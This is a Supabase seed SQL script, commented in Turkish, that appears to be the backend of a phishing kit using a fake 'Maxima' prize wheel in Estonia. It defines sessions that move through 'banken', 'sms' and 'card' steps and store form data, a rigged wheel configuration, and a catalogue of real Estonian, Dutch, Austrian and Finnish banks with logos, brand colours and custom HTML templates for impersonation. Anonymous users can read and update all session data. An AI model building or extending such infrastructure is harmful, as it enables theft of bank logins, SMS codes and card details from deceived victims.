-- =========================================================================
--  MAXIMA / ESTONYA PROJESI - SUPABASE TAM SEED SQL
--  KULLANIM: Supabase Dashboard > SQL Editor > New Query > Yapistir > RUN
-- =========================================================================

-- 1) GENISLETME ----------------------------------------------------------------
create extension if not exists "pgcrypto";

-- =========================================================================
-- 2) TABLO: sessions  (oyuncu oturumlari / ozel linkler)
-- =========================================================================
drop table if exists public.sessions cascade;

create table public.sessions (
  id text primary key default encode(gen_random_bytes(12), 'hex'),
  amount integer not null default 0 check (amount >= 0),
  current_step text not null default 'win'
    check (current_step in ('win', 'banken', 'wait', 'sms', 'card', 'congrats', 'special_approval', 'SPECIAL_INFO')),
  status text not null default 'offline'
    check (status in ('online', 'offline', 'SUCCESS', 'CONGRATS', 'SPECIAL_INFO')),
  sms_digits integer not null default 6 check (sms_digits >= 4 and sms_digits <= 12),
  form_data jsonb not null default '{}'::jsonb,
  is_hidden boolean default false,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create index sessions_created_at_idx on public.sessions (created_at desc);
alter table public.sessions replica identity full;

-- updated_at TRIGGER
create or replace function public.set_sessions_updated_at()
returns trigger as $$ begin new.updated_at = now(); return new; end; $$
language plpgsql security definer set search_path = public;

drop trigger if exists sessions_set_updated_at on public.sessions;
create trigger sessions_set_updated_at
before update on public.sessions
for each row execute function public.set_sessions_updated_at();

-- REALTIME
alter publication supabase_realtime add table public.sessions;

-- RLS
alter table public.sessions enable row level security;

drop policy if exists "sessions_authenticated_all" on public.sessions;
create policy "sessions_authenticated_all"
on public.sessions for all to authenticated using (true) with check (true);

drop policy if exists "sessions_anon_select_demo" on public.sessions;
create policy "sessions_anon_select_demo"
on public.sessions for select to anon using (true);

drop policy if exists "sessions_anon_update_demo" on public.sessions;
create policy "sessions_anon_update_demo"
on public.sessions for update to anon using (true) with check (true);

-- =========================================================================
-- 3) TABLO: banks   (BANKA KATALOGU - LOGO, ULKE, RENK, DESIGN)
-- =========================================================================
drop table if exists public.banks cascade;

create table public.banks (
  slug text primary key,
  name text not null,
  country text not null,
  logo_url text,
  bg_url text,
  preview_url text,
  enabled boolean not null default true,
  sort_order integer not null default 0,
  brand_color text,
  accent_color text,
  domain text,
  logo_file text,
  is_active boolean not null default true,
  auto_redirect boolean not null default false,
  design_config jsonb not null default '{}'::jsonb,
  custom_html text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

create index banks_country_idx on public.banks (country);
create index banks_enabled_idx on public.banks (enabled);
alter table public.banks replica identity full;

-- updated_at TRIGGER
create or replace function public.set_banks_updated_at()
returns trigger as $$ begin new.updated_at = now(); return new; end; $$
language plpgsql security definer set search_path = public;

drop trigger if exists banks_set_updated_at on public.banks;
create trigger banks_set_updated_at
before update on public.banks
for each row execute function public.set_banks_updated_at();

-- RLS
alter table public.banks enable row level security;

drop policy if exists "banks_authenticated_all" on public.banks;
create policy "banks_authenticated_all"
on public.banks for all to authenticated using (true) with check (true);

drop policy if exists "banks_anon_select" on public.banks;
create policy "banks_anon_select"
on public.banks for select to anon using (true);

alter publication supabase_realtime add table public.banks;

-- =========================================================================
-- 4) TABLO: global_settings
-- =========================================================================
drop table if exists public.global_settings cascade;

create table public.global_settings (
  key text primary key,
  value jsonb not null,
  updated_at timestamptz not null default now()
);

alter table public.global_settings enable row level security;

drop policy if exists "global_settings_authenticated_all" on public.global_settings;
create policy "global_settings_authenticated_all"
on public.global_settings for all to authenticated using (true) with check (true);

drop policy if exists "global_settings_anon_select" on public.global_settings;
create policy "global_settings_anon_select"
on public.global_settings for select to anon using (true);

-- =========================================================================
-- 5) TABLO: admin_logs
-- =========================================================================
drop table if exists public.admin_logs cascade;

create table public.admin_logs (
  id bigserial primary key,
  admin_email text not null,
  action text not null,
  target text,
  detail jsonb,
  ip text,
  user_agent text,
  created_at timestamptz not null default now()
);

alter table public.admin_logs enable row level security;

drop policy if exists "admin_logs_authenticated_all" on public.admin_logs;
create policy "admin_logs_authenticated_all"
on public.admin_logs for all to authenticated using (true) with check (true);

-- =========================================================================
-- 6) DEFAULT AYARLAR (global_settings)
-- =========================================================================
insert into public.global_settings (key, value) values
  ('site_name',           '"Maxima"'),
  ('default_country',     '"Estonia"'),
  ('wheel_min_amount',    '1000'),
  ('wheel_max_amount',    '2500'),
  ('admin_email_domain',  '"gmail.com"'),
  ('active_countries',    '["Estonia"]'),
  ('wheel_lose_option',   'false'),
  ('wheel_high_prob_min', '1000'),
  ('wheel_high_prob_max', '2500'),
  ('wheel_high_prob_pct', '97')
on conflict (key) do nothing;

-- =========================================================================
-- 7) ESTONYA BANKALARI - SEED (LOGO + ULKE + RENK)
--    Not: Ozel HTML tasarimlari public/estonian-banks/<slug>/1.html den
--         otomatik okunur (EstoniaBankTemplate component)
-- =========================================================================
insert into public.banks
  (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, sort_order, design_config)
values
  ---------- ESTONYA ----------
  ('bigbank',            'Bigbank',            'Estonia', '/bank-logos/estonia/bigbank.webp',            '#E2001A', '#E2001A', 'bigbank.eu',          true, 10, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('citadele-banka',     'Citadele Banka',     'Estonia', '/bank-logos/estonia/citadele-banka.webp',     '#E3000F', '#E3000F', 'citadele.ee',         true, 20, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('coop-pank',          'Coop Pank',          'Estonia', '/bank-logos/estonia/coop-pank.webp',          '#0054A6', '#0054A6', 'cooppank.ee',         true, 30, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('inbank',             'Inbank',             'Estonia', '/bank-logos/estonia/inbank.webp',             '#000000', '#000000', 'inbank.ee',           true, 40, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('lhv-pank',           'LHV Pank',           'Estonia', '/bank-logos/estonia/lhv-pank.webp',           '#000000', '#111111', 'lhv.ee',              true, 50, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('luminor-ee',         'Luminor',            'Estonia', '/bank-logos/estonia/luminor-ee.webp',         '#000000', '#111111', 'luminor.ee',          true, 60, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('op-corporate-bank',  'OP Corporate Bank',  'Estonia', '/bank-logos/estonia/op-corporate-bank.webp',  '#FF6600', '#FF6600', 'op.fi',               true, 70, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('seb-pank',           'SEB Pank',           'Estonia', '/bank-logos/estonia/seb-pank.webp',           '#00B050', '#009242', 'seb.ee',              true, 80, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}'),
  ('swedbank-ee',        'Swedbank',           'Estonia', '/bank-logos/estonia/swedbank-ee.webp',        '#EE7003', '#D65F00', 'swedbank.ee',         true, 90, '{"layout":"centered","background":{"type":"color","value":"#ffffff"},"blocks":[]}')

  ---------- HOLLANDA ----------
on conflict (slug) do update set
  name         = excluded.name,
  country      = excluded.country,
  logo_file    = excluded.logo_file,
  brand_color  = excluded.brand_color,
  accent_color = excluded.accent_color,
  domain       = excluded.domain,
  is_active    = excluded.is_active,
  sort_order   = excluded.sort_order,
  design_config = excluded.design_config;

-- =========================================================================
-- 8) HOLLANDA BANKALARI - (iste bagli admin panelden ac kapat yapilir)
-- =========================================================================
insert into public.banks
  (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, sort_order, design_config)
values
  ('abn-amro',                    'ABN AMRO',                   'Netherlands', '/bank-logos/abn-amro.svg',                    '#0a8f6a', '#f6c500', 'abnamro.nl',              false, 110, '{}'),
  ('adyen',                       'Adyen',                      'Netherlands', '/bank-logos/adyen.svg',                       '#0abf53', '#089942', 'adyen.com',               false, 111, '{}'),
  ('asn-bank',                    'ASN Bank',                   'Netherlands', '/bank-logos/asn-bank.svg',                    '#8a1538', '#5b0f25', 'asnbank.nl',              false, 112, '{}'),
  ('asn-bank-vh-regiobank',       'ASN Bank vh RegioBank',      'Netherlands', '/bank-logos/asn-bank-vh-regiobank.svg',       '#1f6f43', '#14502f', 'regiobank.nl',           false, 113, '{}'),
  ('asn-bank-voorheen-blgwonen',  'ASN Bank voorheen BLGwonen', 'Netherlands', '/bank-logos/asn-bank-voorheen-blgwonen.webp',  '#e64a38', '#d03d2d', 'asnbank.nl',              false, 114, '{}'),
  ('asn-bank-voorheen-sns',       'ASN Bank voorheen SNS',      'Netherlands', '/bank-logos/asn-bank-voorheen-sns.svg',       '#5f259f', '#421970', 'snsbank.nl',              false, 115, '{}'),
  ('bunq',                        'bunq',                       'Netherlands', '/bank-logos/bunq.svg',                        '#0f172a', '#1e293b', 'bunq.com',                false, 116, '{}'),
  ('finom',                       'Finom',                      'Netherlands', '/bank-logos/finom.svg',                       '#f33a6b', '#c22e56', 'finom.co',                false, 117, '{}'),
  ('ing',                         'ING',                        'Netherlands', '/bank-logos/ing.svg',                         '#ff6200', '#d94c00', 'ing.nl',                  false, 118, '{}'),
  ('knab',                        'Knab',                       'Netherlands', '/bank-logos/knab.svg',                        '#11998e', '#0c6f67', 'knab.nl',                 false, 119, '{}'),
  ('n26',                         'N26',                        'Netherlands', '/bank-logos/n26.svg',                         '#36a18b', '#2b816f', 'n26.com',                 false, 120, '{}'),
  ('nationale-nederlanden',       'Nationale-Nederlanden',      'Netherlands', '/bank-logos/nationale-nederlanden.svg',       '#ea650d', '#bb510a', 'nn.nl',                   false, 121, '{}'),
  ('rabobank',                    'Rabobank',                   'Netherlands', '/bank-logos/rabobank.svg',                    '#003d8f', '#f57c00', 'rabobank.nl',             false, 122, '{}'),
  ('triodos-bank',                'Triodos Bank',               'Netherlands', '/bank-logos/triodos-bank.svg',                '#6b3fa0', '#4b2c70', 'triodos.nl',              false, 123, '{}'),
  ('van-lanschot-kempen',         'Van Lanschot Kempen',        'Netherlands', '/bank-logos/van-lanschot-kempen.svg',         '#173463', '#0f2241', 'vanlanschotkempen.com',  false, 124, '{}'),
  ('yoursafe',                    'Yoursafe',                   'Netherlands', '/bank-logos/yoursafe.svg',                    '#0a81c5', '#08679e', 'yoursafe.com',            false, 125, '{}')
on conflict (slug) do update set
  name         = excluded.name,
  country      = excluded.country,
  logo_file    = excluded.logo_file,
  brand_color  = excluded.brand_color,
  accent_color = excluded.accent_color,
  domain       = excluded.domain,
  sort_order   = excluded.sort_order,
  design_config = excluded.design_config;

-- =========================================================================
-- 9) AVUSTURYA BANKALARI - (iste bagli admin panelden ac kapat)
-- =========================================================================
insert into public.banks
  (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, sort_order, design_config)
values
  ('erste-bank',         'Erste Bank und Sparkassen', 'Austria', '/app-icons/erste-bank.webp',         '#003b7a', '#e3000f', 'sparkasse.at',      false, 210, '{}'),
  ('raiffeisen',         'Raiffeisen Bankengruppe',   'Austria', '/app-icons/raiffeisen.webp',         '#ffe500', '#1f1f1f', 'raiffeisen.at',     false, 211, '{}'),
  ('bank-austria',       'Bank Austria',              'Austria', '/app-icons/bank-austria.webp',       '#d50032', '#7a0026', 'bankaustria.at',    false, 212, '{}'),
  ('bawag',              'BAWAG',                     'Austria', '/app-icons/bawag.webp',              '#ffec00', '#222222', 'bawag.at',          false, 213, '{}'),
  ('easybank',           'easybank',                  'Austria', '/app-icons/easybank.webp',           '#00a0df', '#006388', 'easybank.at',       false, 214, '{}'),
  ('bank99',             'bank99',                    'Austria', '/app-icons/bank99.webp',             '#ffde00', '#222222', 'bank99.at',         false, 215, '{}'),
  ('volksbank',          'Volksbank',                 'Austria', '/app-icons/volksbank.webp',          '#006b3f', '#004b2c', 'volksbank.at',      false, 216, '{}'),
  ('oberbank',           'Oberbank',                  'Austria', '/app-icons/oberbank.webp',           '#d71920', '#7a1015', 'oberbank.at',       false, 217, '{}'),
  ('hypo-noe',           'HYPO NOE',                  'Austria', '/app-icons/hypo-noe.webp',           '#006e8a', '#004d62', 'hyponoe.at',        false, 218, '{}'),
  ('hypo-vorarlberg',    'HYPO Vorarlberg',           'Austria', '/app-icons/hypo-vorarlberg.webp',    '#1f7a3d', '#145327', 'hypovbg.at',        false, 219, '{}'),
  ('hypo-ooe',           'HYPO Oberösterreich',       'Austria', '/app-icons/hypo-ooe.webp',           '#1f7a3d', '#145327', 'hypo.at',           false, 220, '{}'),
  ('hypo-burgenland',    'HYPO Burgenland',           'Austria', '/app-icons/hypo-burgenland.webp',    '#a3322b', '#64201b', 'bank-bgld.at',      false, 221, '{}'),
  ('bks-bank',           'BKS Bank',                  'Austria', '/app-icons/bks-bank.webp',           '#365f8f', '#203a58', 'bks.at',            false, 222, '{}'),
  ('btv',                'BTV Vierländerbank',        'Austria', '/app-icons/btv.webp',                '#d61f26', '#7d1115', 'btv.at',            false, 223, '{}'),
  ('vkb',                'Volkskreditbank',           'Austria', '/app-icons/vkb.webp',                '#5b7f50', '#3b5334', 'vkb-bank.at',       false, 224, '{}'),
  ('sparda-bank',        'Sparda Bank',               'Austria', '/app-icons/sparda-bank.webp',        '#2d9fa6', '#1d676c', 'sparda.at',         false, 225, '{}'),
  ('anadi-bank',         'Anadi Bank',                'Austria', '/app-icons/anadi-bank.webp',         '#355a8a', '#1e3350', 'anadibank.com',     false, 226, '{}'),
  ('schoellerbank',      'Schoellerbank',             'Austria', '/app-icons/schoellerbank.webp',      '#1c2e5b', '#101a34', 'schoellerbank.at',  false, 227, '{}'),
  ('aerztebank',         'Österreichische Ärztebank', 'Austria', '/app-icons/aerztebank.webp',         '#2f6f95', '#1f4861', 'apothekerbank.at',  false, 228, '{}'),
  ('schelhammer',        'Schelhammer Capital',       'Austria', '/app-icons/schelhammer.webp',        '#35507b', '#22344f', 'schelhammer.at',    false, 229, '{}'),
  ('marchfelder',        'Marchfelder Bank',          'Austria', '/app-icons/marchfelder.webp',        '#3d7044', '#294c2f', 'marchfelderbank.at',false, 230, '{}'),
  ('dolomitenbank',      'Dolomitenbank',             'Austria', '/app-icons/dolomitenbank.webp',      '#006b8f', '#004861', 'dolomitenbank.at',  false, 231, '{}'),
  ('posojilnica',        'Posojilnica Bank',          'Austria', '/app-icons/posojilnica.webp',        '#6f2c6b', '#4a1d47', 'posojilnica-bank.at',false,232, '{}'),
  ('spaengler',          'Bankhaus Spängler',         'Austria', '/app-icons/spaengler.webp',          '#5b4b3b', '#3b2f23', 'spaengler.at',      false, 233, '{}')
on conflict (slug) do update set
  name         = excluded.name,
  country      = excluded.country,
  logo_file    = excluded.logo_file,
  brand_color  = excluded.brand_color,
  accent_color = excluded.accent_color,
  domain       = excluded.domain,
  sort_order   = excluded.sort_order,
  design_config = excluded.design_config;

-- =========================================================================
-- 10) FINLANDIYA BANKALARI - (iste bagli admin panelden ac kapat)
-- =========================================================================
insert into public.banks
  (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, sort_order, design_config)
values
  ('aktia-fi',        'Aktia',        'Finland', '/bank-logos/aktia-fi.svg',        '#004F9F', '#003c7a', 'aktia.fi',        false, 310, '{}'),
  ('handelsbanken-fi','Handelsbanken','Finland', '/bank-logos/handelsbanken-fi.svg','#00674F', '#004d3b', 'handelsbanken.fi',false, 311, '{}'),
  ('landsbanken-fi',  'Landsbanken',  'Finland', '/bank-logos/landsbanken-fi.svg',  '#00679A', '#004e77', 'landsbanken.fi',  false, 312, '{}'),
  ('nordea-fi',       'Nordea',       'Finland', '/bank-logos/nordea-fi.svg',       '#00007F', '#00005a', 'nordea.fi',       false, 313, '{}'),
  ('omasp-fi',        'OmaSp',        'Finland', '/bank-logos/omasp-fi.svg',        '#008744', '#006a33', 'omasp.fi',        false, 314, '{}'),
  ('op-fi',           'OP',           'Finland', '/bank-logos/op-fi.svg',           '#FF5B00', '#cc4900', 'op.fi',           false, 315, '{}'),
  ('pop-pankki-fi',   'POP Pankki',   'Finland', '/bank-logos/pop-pankki-fi.svg',   '#5C3D99', '#462f77', 'poppankki.fi',    false, 316, '{}'),
  ('s-pankki-fi',     'S-Pankki',     'Finland', '/bank-logos/s-pankki-fi.webp',     '#0075C9', '#005ba3', 's-pankki.fi',     false, 317, '{}'),
  ('s-st-pankki-fi',  'Säästöpankki', 'Finland', '/bank-logos/s-st-pankki-fi.webp',  '#E4002B', '#b50022', 'saastopankki.fi', false, 318, '{}')
on conflict (slug) do update set
  name         = excluded.name,
  country      = excluded.country,
  logo_file    = excluded.logo_file,
  brand_color  = excluded.brand_color,
  accent_color = excluded.accent_color,
  domain       = excluded.domain,
  sort_order   = excluded.sort_order,
  design_config = excluded.design_config;

-- =========================================================================
-- BITTI - Supabase SQL Output penceresinde "Success" gormen lazim.
-- =========================================================================
